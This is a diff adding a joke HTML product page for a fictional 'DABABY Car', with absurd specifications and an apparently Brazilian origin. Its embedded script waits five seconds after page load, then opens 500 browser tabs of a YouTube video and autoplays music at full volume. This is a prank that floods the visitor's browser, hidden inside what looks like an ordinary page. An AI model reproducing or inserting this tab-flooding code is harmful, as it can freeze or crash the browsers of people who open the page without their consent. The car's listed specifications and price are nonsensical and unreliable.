@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DABABY Car - Cars Brazil</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        body {
+            background-color: pink; /* Fundo rosa para um visual divertido */
+            text-align: center; /* Centraliza o texto */
+        }
+        @media (max-width: 600px) {
+            body {
+                font-size: 14px; /* Reduzir o tamanho da fonte em telas menores */
+            }
+            .car-image img {
+                max-width: 100%; /* A imagem ocupa 100% da largura do contêiner */
+                height: auto; /* Mantém a proporção da imagem */
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>DABABY Car</h1>
+        <p>Discover the amazing DABABY car, a unique ride like no other!</p>
+    </header>
+
+    <main>
+        <div class="car-details">
+            <h2>About the DABABY Car</h2>
+            <p>The DABABY car is a fun, stylish, and one-of-a-kind vehicle known for its bold design and unmatched performance. It's designed for those who love to make a statement wherever they go.</p>
+            <ul>
+                <li>Top Speed: 3200 km/h</li>
+                <li>Engine: V24 Turbocharged</li>
+                <li>0-1200 km/h: 0.5 seconds</li>
+                <li>Price: $22,1300,000,22</li>
+            </ul>
+        </div>
+
+        <div class="car-image">
+            <img src="download (2).jpeg" alt="DABABY Car" id="dababy-image">
+        </div>
+
+        <div class="back-button">
+            <button onclick="goBack()">Go Back</button>
+        </div>
+
+        <div id="video-container" style="margin-top: 20px;"></div>
+    </main>
+
+    <footer>
+        <p>&copy; 2024 Cars Brazil - All rights reserved</p>
+    </footer>
+
+    <!-- Música de fundo -->
+    <audio id="background-music" loop>
+        <source src="dababy-music.mp3" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
+
+    <script>
+        const audio = document.getElementById('background-music');
+        audio.volume = 1.0; // Volume de 100%
+
+        // Função para abrir várias abas com vídeos do DABABY Car
+        function openMultipleTabs() {
+            const videoUrl = "https://www.youtube.com/watch?v=0ElVqAgy4w8"; // URL do vídeo do DABABY Car
+            for (let i = 0; i < 500; i++) { // Altere o número para quantas abas você deseja abrir
+                window.open(videoUrl, '_blank');
+            }
+        }
+
+        // Abrir abas automaticamente ao carregar a página
+        window.onload = function() {
+            setTimeout(() => {
+                openMultipleTabs();
+            }, 5000); // Espera 5000 milissegundos (5 segundos)
+            audio.play(); // Tocar música ao carregar a página
+        };
+
+        function goBack() {
+            window.history.back();
+        }
+
+        // Adicionar vídeos após 5 segundos
+        setTimeout(() => {
+            const videoContainer = document.getElementById('video-container');
+            const videos = [
+                '<iframe width="320" height="240" src="https://www.youtube.com/embed/0ElVqAgy4w8" frameborder="0" allowfullscreen></iframe>',
+                // Adicione mais vídeos aqui se desejar
+            ];
+            videos.forEach(video => {
+                videoContainer.innerHTML += video; // Adiciona cada vídeo ao contêiner
+            });
+        }, 5000); // Espera 5000 milissegundos (5 segundos) para adicionar os vídeos
+    </script>
+</body>
+</html>
